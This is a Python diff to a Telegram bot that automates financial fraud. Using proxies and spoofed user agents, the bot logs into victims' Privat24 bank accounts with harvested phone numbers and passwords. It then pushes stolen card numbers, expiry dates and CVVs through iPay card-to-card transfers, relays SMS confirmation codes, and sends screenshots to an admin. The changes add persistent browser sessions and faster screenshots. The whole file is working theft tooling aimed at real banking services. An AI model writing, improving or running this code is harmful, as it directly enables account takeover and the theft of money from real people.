@@ -37,6 +37,7 @@ dp.middleware.setup(LoggingMiddleware())
 class PaymentStates(StatesGroup):
     waiting_code = State()
 
+# ========== КНОПКИ ==========
 def get_main_menu():
     kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     kb.add(KeyboardButton("🏠 Главное меню"), KeyboardButton("⚙️ Админ-панель"))
@@ -66,7 +67,8 @@ def init_db():
         mode TEXT,
         status TEXT,
         msg_id INTEGER,
-        timestamp TEXT
+        timestamp TEXT,
+        page_context TEXT
     )""")
     c.execute("""CREATE TABLE IF NOT EXISTS settings (
         key TEXT PRIMARY KEY,
@@ -198,21 +200,32 @@ def rotate_proxy():
         pass
     return get_setting('proxy'), get_setting('proxy_type')
 
-# ========== СКРИНШОТ ==========
-async def take_screenshot():
-    try:
-        async with async_playwright() as p:
-            browser = await p.chromium.launch(headless=True)
-            page = await browser.new_page()
-            await page.goto("https://next.privat24.ua", wait_until="networkidle", timeout=30000)
-            screenshot = await page.screenshot()
-            await browser.close()
+# ========== ГЛОБАЛЬНЫЙ КОНТЕКСТ ДЛЯ СКРИНШОТОВ ==========
+page_contexts = {}
+
+def save_page_context(session_id, page, browser):
+    page_contexts[session_id] = {"page": page, "browser": browser}
+
+def get_page_context(session_id):
+    return page_contexts.get(session_id)
+
+def clear_page_context(session_id):
+    if session_id in page_contexts:
+        del page_contexts[session_id]
+
+# ========== СКРИНШОТ (БЫСТРЫЙ) ==========
+async def take_fast_screenshot(session_id):
+    context = get_page_context(session_id)
+    if context and context.get("page"):
+        try:
+            screenshot = await context["page"].screenshot()
             return screenshot
-    except Exception as e:
-        return None
+        except:
+            return None
+    return None
 
 # ========== ВХОД В ПРИВАТ24 ==========
-async def login_privat24(phone, password, user_agent=None, proxy_str=None, proxy_type="http"):
+async def login_privat24(session_id, phone, password, user_agent=None, proxy_str=None, proxy_type="http"):
     try:
         async with async_playwright() as p:
             browser_args = []
@@ -231,49 +244,57 @@ async def login_privat24(phone, password, user_agent=None, proxy_str=None, proxy
             )
             page = await context.new_page()
             
+            # Сохраняем контекст для быстрых скриншотов
+            save_page_context(session_id, page, browser)
+            
+            # ШАГ 1: Открываем главную
             await page.goto("https://next.privat24.ua", wait_until="networkidle", timeout=30000)
-            await asyncio.sleep(2)
+            await asyncio.sleep(1)
             
-            login_button = await page.wait_for_selector('a:has-text("Вхід"), button:has-text("Вхід")', timeout=15000)
-            if login_button:
-                await login_button.click()
-                await asyncio.sleep(2)
-            
-            phone_input = await page.wait_for_selector('input[name="phone"], input[type="tel"]', timeout=15000)
-            if phone_input:
-                await phone_input.fill(phone)
+            # ШАГ 2: Нажимаем "Вхід"
+            login_btn = await page.wait_for_selector('a:has-text("Вхід"), button:has-text("Вхід")', timeout=10000)
+            if login_btn:
+                await login_btn.click()
                 await asyncio.sleep(1)
             
+            # ШАГ 3: Вводим номер
+            phone_input = await page.wait_for_selector('input[name="phone"], input[type="tel"]', timeout=10000)
+            if phone_input:
+                await phone_input.fill(phone)
+                await asyncio.sleep(0.5)
+                submit_btn = await page.wait_for_selector('button[type="submit"], button:has-text("Продовжити")', timeout=5000)
+                if submit_btn:
+                    await submit_btn.click()
+                    await asyncio.sleep(1)
+            
+            # ШАГ 4: Вводим пароль
             password_input = await page.wait_for_selector('input[name="password"], input[type="password"]', timeout=10000)
             if password_input:
                 await password_input.fill(password)
-                await asyncio.sleep(1)
+                await asyncio.sleep(0.5)
+                login_submit = await page.wait_for_selector('button[type="submit"], button:has-text("Увійти")', timeout=5000)
+                if login_submit:
+                    await login_submit.click()
+                    await asyncio.sleep(2)
             
-            submit_button = await page.wait_for_selector('button[type="submit"], button:has-text("Продовжити"), button:has-text("Увійти")', timeout=10000)
-            if submit_button:
-                await submit_button.click()
-                await asyncio.sleep(3)
-            
+            # ШАГ 5: Проверяем код
             code_input = await page.query_selector('input[name="code"]')
             if code_input:
                 screenshot = await page.screenshot()
-                await browser.close()
                 return {"status": "waiting_code", "message": "Требуется код", "screenshot": screenshot}
             
             if "cabinet" in page.url or "Особистий кабінет" in await page.title():
                 screenshot = await page.screenshot()
-                await browser.close()
                 return {"status": "success", "message": "✅ Вход выполнен", "screenshot": screenshot}
             
             screenshot = await page.screenshot()
-            await browser.close()
             return {"status": "error", "message": "❌ Не удалось войти", "screenshot": screenshot}
             
     except Exception as e:
         return {"status": "error", "message": f"❌ Ошибка: {str(e)[:100]}"}
 
-# ========== ПЕРЕВОД ==========
-async def make_payment(card_from, expiry, cvv, card_to, amount, proxy_str=None, proxy_type="http"):
+# ========== ПЕРЕВОД ЧЕРЕЗ IPAY ==========
+async def make_payment(session_id, card_from, expiry, cvv, card_to, amount, proxy_str=None, proxy_type="http"):
     try:
         async with async_playwright() as p:
             browser_args = []
@@ -290,8 +311,11 @@ async def make_payment(card_from, expiry, cvv, card_to, amount, proxy_str=None, 
             )
             page = await context.new_page()
             
+            # Сохраняем контекст для скриншотов
+            save_page_context(session_id, page, browser)
+            
             await page.goto("https://ipay.ua/card2card", wait_until="networkidle", timeout=30000)
-            await asyncio.sleep(2)
+            await asyncio.sleep(1)
             
             await page.fill('input[name="card_from"]', card_from)
             await page.fill('input[name="expiry"]', expiry)
@@ -299,15 +323,20 @@ async def make_payment(card_from, expiry, cvv, card_to, amount, proxy_str=None, 
             await page.fill('input[name="card_to"]', card_to)
             await page.fill('input[name="amount"]', str(amount))
             await page.click('button[type="submit"]')
-            await asyncio.sleep(5)
+            await asyncio.sleep(3)
             
-            if await page.is_visible('input[name="code"]'):
-                return {"status": "waiting_code", "message": "Требуется код"}
+            code_input = await page.query_selector('input[name="code"]')
+            if code_input:
+                screenshot = await page.screenshot()
+                return {"status": "waiting_code", "message": "Требуется код", "screenshot": screenshot}
             
             if await page.is_visible('.success'):
-                return {"status": "success", "message": f"✅ Платёж на {amount} UAH выполнен"}
+                screenshot = await page.screenshot()
+                return {"status": "success", "message": f"✅ Платёж на {amount} UAH выполнен", "screenshot": screenshot}
             
-            return {"status": "error", "message": "❌ Ошибка платежа"}
+            screenshot = await page.screenshot()
+            return {"status": "error", "message": "❌ Ошибка платежа", "screenshot": screenshot}
+            
     except Exception as e:
         return {"status": "error", "message": f"❌ Ошибка: {str(e)[:100]}"}
 
@@ -404,17 +433,19 @@ async def show_status(callback: types.CallbackQuery):
 
 @dp.callback_query_handler(lambda c: c.data.startswith("screenshot_"))
 async def handle_screenshot(callback: types.CallbackQuery):
+    session_id = int(callback.data.split("_")[1])
     await callback.answer("📸 Делаю скриншот...")
-    screenshot = await take_screenshot()
+    screenshot = await take_fast_screenshot(session_id)
     if screenshot:
-        await callback.message.reply_photo(photo=screenshot, caption="📸 Скриншот страницы Приват24")
+        await callback.message.reply_photo(photo=screenshot, caption="📸 Скриншот текущей страницы")
     else:
-        await callback.message.reply("❌ Не удалось сделать скриншот")
+        await callback.message.reply("❌ Нет активной страницы для скриншота. Попробуйте позже.")
 
 @dp.callback_query_handler(lambda c: c.data.startswith("cancel_"))
 async def handle_cancel(callback: types.CallbackQuery):
     session_id = int(callback.data.split("_")[1])
     update_session(session_id, 'status', 'cancelled')
+    clear_page_context(session_id)
     await callback.message.reply("❌ Действие отменено.")
     await callback.answer()
 
@@ -429,7 +460,7 @@ async def handle_login(callback: types.CallbackQuery):
         return
     phone, password, user_agent = session[1], session[2], session[5]
     await callback.message.reply("⏳ Выполняю вход...", reply_markup=get_action_keyboard(session_id))
-    result = await login_privat24(phone, password, user_agent, proxy_str, proxy_type)
+    result = await login_privat24(session_id, phone, password, user_agent, proxy_str, proxy_type)
     if result.get('screenshot'):
         await callback.message.reply_photo(photo=result['screenshot'], caption=result['message'])
     else:
@@ -440,8 +471,10 @@ async def handle_login(callback: types.CallbackQuery):
         await callback.message.reply("🔐 Введите код из СМС (в любое сообщение):")
     elif result['status'] == 'success':
         update_session(session_id, 'status', 'completed')
+        clear_page_context(session_id)
     else:
         update_session(session_id, 'status', 'failed')
+        clear_page_context(session_id)
 
 @dp.callback_query_handler(lambda c: c.data.startswith("amount_"))
 async def handle_amount(callback: types.CallbackQuery):
@@ -457,7 +490,7 @@ async def handle_amount(callback: types.CallbackQuery):
         return
     card_from, expiry, cvv, card_to = session[3], session[4], session[5], session[7]
     await callback.message.reply(f"🚀 Платёж на {amount} UAH...", reply_markup=get_action_keyboard(session_id))
-    result = await make_payment(card_from, expiry, cvv, card_to, amount, proxy_str, proxy_type)
+    result = await make_payment(session_id, card_from, expiry, cvv, card_to, amount, proxy_str, proxy_type)
     if result.get('screenshot'):
         await callback.message.reply_photo(photo=result['screenshot'], caption=result['message'])
     else:
@@ -468,8 +501,10 @@ async def handle_amount(callback: types.CallbackQuery):
         await callback.message.reply("🔐 Введите код из СМС (в любое сообщение):")
     elif result['status'] == 'success':
         update_session(session_id, 'status', 'completed')
+        clear_page_context(session_id)
     else:
         update_session(session_id, 'status', 'failed')
+        clear_page_context(session_id)
 
 @dp.message_handler(state=PaymentStates.waiting_code)
 async def handle_code(msg: types.Message, state: FSMContext):
@@ -484,6 +519,7 @@ async def handle_code(msg: types.Message, state: FSMContext):
         return
     await msg.reply("✅ Код подтверждён!")
     update_session(session_id, 'status', 'completed')
+    clear_page_context(session_id)
     await state.finish()
 
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.reply_to_message)
@@ -528,7 +564,7 @@ async def handle_log(msg: types.Message):
             kb.insert(InlineKeyboardButton(str(a), callback_data=f"amount_{session_id}_{a}"))
         kb.add(InlineKeyboardButton("📸 Скрин", callback_data=f"screenshot_{session_id}"))
         await msg.reply(
-            f"✅ Данные для платежа:\n💳 Карта: {data['card'][:4]}****{data['card'][-4:]}\n"
+            f"✅ Данные для платежа (iPay):\n💳 Карта: {data['card'][:4]}****{data['card'][-4:]}\n"
             f"📅 Срок: {data['expiry']}\n🎳 CVV: ***\n🌍 IP: {data['ip']}\n"
             f"👻 UA: {data['user_agent'][:30]}...\n📱 Модель: {data['device_model']}\n\n"
             f"💰 Выберите сумму:",
